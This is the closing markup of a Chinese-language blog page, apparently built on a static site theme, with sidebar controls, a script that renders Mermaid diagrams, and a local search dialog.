id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.2"></script><script src="/js/main.js?v=5.5.2"></script><script src="/js/tw_cn.js?v=5.5.2"></script><div class="js-pjax"><script>(() => {
  const runMermaid = ele => {
    window.loadMermaid = true
    const theme = document.documentElement.getAttribute('data-theme') === 'dark' ? 'dark' : 'default'

    ele.forEach((item, index) => {
      const mermaidSrc = item.firstElementChild
      const config = mermaidSrc.dataset.config ? JSON.parse(mermaidSrc.dataset.config) : {}
      if (!config.theme) {
        config.theme = theme
      }
      const mermaidThemeConfig = `%%{init: ${JSON.stringify(config)}}%%\n`
      const mermaidID = `mermaid-${index}`
      const mermaidDefinition = mermaidThemeConfig + mermaidSrc.textContent

      const renderFn = mermaid.render(mermaidID, mermaidDefinition)
      const renderMermaid = svg => {
        mermaidSrc.insertAdjacentHTML('afterend', svg)
      }

      // mermaid v9 and v10 compatibility
      typeof renderFn === 'string' ? renderMermaid(renderFn) : renderFn.then(({ svg }) => renderMermaid(svg))
    })
  }

  const codeToMermaid = () => {
    const codeMermaidEle = document.querySelectorAll('pre > code.mermaid')
    if (codeMermaidEle.length === 0) return

    codeMermaidEle.forEach(ele => {
      const preEle = document.createElement('pre')
      preEle.className = 'mermaid-src'
      preEle.hidden = true
      preEle.textContent = ele.textContent
      const newEle = document.createElement('div')
      newEle.className = 'mermaid-wrap'
      newEle.appendChild(preEle)
      ele.parentNode.replaceWith(newEle)
    })
  }

  const loadMermaid = () => {
    if (false) codeToMermaid()
    const $mermaid = document.querySelectorAll('#article-container .mermaid-wrap')
    if ($mermaid.length === 0) return

    const runMermaidFn = () => runMermaid($mermaid)
    btf.addGlobalFn('themeChange', runMermaidFn, 'mermaid')
    window.loadMermaid ? runMermaidFn() : btf.getScript('https://cdn.jsdelivr.net/npm/mermaid@11.12.1/dist/mermaid.min.js').then(runMermaidFn)
  }

  btf.addGlobalFn('encrypt', loadMermaid, 'mermaid')
  window.pjax ? loadMermaid() : document.addEventListener('DOMContentLoaded', loadMermaid)
})()</script></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><i class="fas fa-spinner fa-pulse" id="loading-status" hidden="hidden"></i><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="local-search-input"><input placeholder="搜索文章" type="text"/></div><hr/><div id="local-search-results"></div><div class="ais-Pagination" id="local-search-pagination" style="display:none;"><ul class="ais-Pagination-list"></ul></div><div id="local-search-stats"></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=5.5.2"></script></div></div></body></html>